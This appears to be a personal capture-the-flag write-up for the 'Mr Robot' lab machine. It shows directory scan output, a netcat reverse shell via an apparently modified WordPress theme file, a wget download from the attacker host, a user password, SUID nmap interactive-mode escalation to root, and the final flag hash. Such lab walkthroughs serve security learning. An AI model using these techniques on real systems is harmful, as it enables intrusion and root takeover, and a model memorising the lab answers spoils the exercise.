200      GET      178l      774w     5899c https://10.10.197.198/wp-content/themes/twentyfifteen/js/functions.js
200      GET        2l      204w     7200c https://10.10.197.198/wp-includes/js/jquery/jquery-migrate.min.js
200      GET        6l     2259w   182009c https://10.10.197.198/js/vendor/vendor-48ca455c.js
200      GET       53l      158w     2619c https://10.10.197.198/wp-login.php
200      GET        1l      155w     8596c https://10.10.197.198/css/main-600a9791.css
200      GET    10295l    53814w   495992c https://10.10.197.198/js/main-acba06a5.js
200      GET       26l       94w      727c https://10.10.197.198/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js
200      GET       30l       98w     1077c https://10.10.197.198/index.html
200      GET      636l     2179w    55357c https://10.10.197.198/js/s_code.js
301      GET        0l        0w        0c https://10.10.197.198/.git/logs/comments/feed => https://10.10.197.198/.git/logs/feed/
200      GET       30l       98w     1077c https://10.10.197.198/
301      GET        0l        0w        0c https://10.10.197.198/.git/index.php => https://10.10.197.198/.git/
200      GET        6l     1414w    95977c https://10.10.197.198/wp-includes/js/jquery/jquery.js
301      GET        0l        0w        0c https://10.10.197.198/.git/comments/feed => https://10.10.197.198/.git/feed/
301      GET        0l        0w        0c https://10.10.197.198/.well-known/comments/feed => https://10.10.197.198/.well-known/feed/
301      GET        0l        0w        0c https://10.10.197.198/.svn/comments/feed => https://10.10.197.198/.svn/feed/
301      GET        0l        0w        0c https://10.10.197.198/.well-known/autoconfig/comments/feed => https://10.10.197.198/.well-known/autoconfig/feed/
301      GET        0l        0w        0c https://10.10.197.198/0 => https://10.10.197.198/0/
301      GET        0l        0w        0c https://10.10.197.198/CVS/comments/feed => https://10.10.197.198/CVS/feed/
301      GET        0l        0w        0c https://10.10.197.198/Image => https://10.10.197.198/Image/
301      GET        0l        0w        0c https://10.10.197.198/_vti_bin/_vti_aut/comments/feed => https://10.10.197.198/_vti_bin/_vti_aut/feed/
301      GET        0l        0w        0c https://10.10.197.198/_vti_bin/comments/feed => https://10.10.197.198/_vti_bin/feed/
301      GET        0l        0w        0c https://10.10.197.198/_vti_bin/_vti_adm/comments/feed => https://10.10.197.198/_vti_bin/_vti_adm/feed/
301      GET        7l       20w      236c https://10.10.197.198/admin => https://10.10.197.198/admin/
301      GET        0l        0w        0c https://10.10.197.198/android/comments/feed => https://10.10.197.198/android/feed/
301      GET        0l        0w        0c https://10.10.197.198/api/comments/feed => https://10.10.197.198/api/feed/
301      GET        0l        0w        0c https://10.10.197.198/api/experiments/comments/feed => https://10.10.197.198/api/experiments/feed/
```


## Initial Foothold

![[Pasted image 20220808215621.png]]

![[Pasted image 20220808220658.png]]

```http://10.10.80.126/wp-content/themes/twentyfourteen/archive.php```

```shell
┌──(root㉿enum-more)-[~/…/MrRobotCTF/results/10.10.197.198/exploit]
└─# rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.11.77.75] from (UNKNOWN) [10.10.80.126] 50662
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 16:48:53 up  2:04,  0 users,  load average: 0.00, 0.04, 0.98
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
python -c 'import pty; pty.spawn("/bin/bash")'
```


## Privilege Escalation

```shell
su robot
abcdefghijklmnopqrstuvwxyz

cd /tmp
cd /tmp
wget http://10.11.77.75:80/suid3num.py
wget http://10.11.77.75:80/suid3num.py
--2022-08-08 16:49:46--  http://10.11.77.75/suid3num.py
Connecting to 10.11.77.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16632 (16K) [text/x-python]
Saving to: ‘suid3num.py’

100%[======================================>] 16,632      99.7KB/s   in 0.2s   

2022-08-08 16:49:46 (99.7 KB/s) - ‘suid3num.py’ saved [16632/16632]

chmod +x suid3num.py
chmod +x suid3num.py
python suid3num.py
python suid3num.py
  ___ _   _ _ ___    _____  _ _   _ __  __ 
 / __| | | / |   \  |__ / \| | | | |  \/  |
 \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |
 |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar

[#] Finding/Listing all SUID Binaries ..
------------------------------
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
------------------------------


[!] Default Binaries (Dont bother)
------------------------------
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
------------------------------


[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/local/bin/nmap
/usr/lib/pt_chown
------------------------------


[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/local/bin/nmap -~> https://gtfobins.github.io/gtfobins/nmap/#suid
------------------------------


[&] Manual Exploitation (Binaries which create files on the system)
------------------------------
[&] Nmap ( /usr/local/bin/nmap )
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
/usr/local/bin/nmap --script=$TF

------------------------------


TF=$(mktemp)
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
echo 'os.execute("/bin/sh")' > $TF
/usr/local/bin/nmap --script=$TF
/usr/local/bin/nmap --script=$TF
/usr/local/bin/nmap: unrecognized option '--script=/tmp/tmp.pc6iggSjau'
Nmap 3.81 Usage: nmap [Scan Type(s)] [Options] <host or net list>
Some Common Scan Types ('*' options require root privileges)
* -sS TCP SYN stealth port scan (default if privileged (root))
  -sT TCP connect() port scan (default for unprivileged users)
* -sU UDP port scan
  -sP ping scan (Find any reachable machines)
* -sF,-sX,-sN Stealth FIN, Xmas, or Null scan (experts only)
  -sV Version scan probes open ports determining service & app names/versions
  -sR RPC scan (use with other scan types)
Some Common Options (none are required, most can be combined):
* -O Use TCP/IP fingerprinting to guess remote operating system
  -p <range> ports to scan.  Example range: 1-1024,1080,6666,31337
  -F Only scans ports listed in nmap-services
  -v Verbose. Its use is recommended.  Use twice for greater effect.
  -P0 Dont ping hosts (needed to scan www.microsoft.com and others)
* -Ddecoy_host1,decoy2[,...] Hide scan using many decoys
  -6 scans via IPv6 rather than IPv4
  -T <Paranoid|Sneaky|Polite|Normal|Aggressive|Insane> General timing policy
  -n/-R Never do DNS resolution/Always resolve [default: sometimes resolve]
  -oN/-oX/-oG <logfile> Output normal/XML/grepable scan logs to <logfile>
  -iL <inputfile> Get targets from file; Use '-' for stdin
* -S <your_IP>/-e <devicename> Specify source address or network interface
  --interactive Go into interactive mode (then press h for help)
Example: nmap -v -sS -O www.my.com 192.168.0.0/16 '192.88-90.*.*'
SEE THE MAN PAGE FOR MANY MORE OPTIONS, DESCRIPTIONS, AND EXAMPLES 
nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
!sh
!sh
id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
whoami
whoami
root
cd /root
cd /root
ls
ls
firstboot_done	key-3-of-3.txt
cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

## Conclusion

![[Pasted image 20220808222457.png]]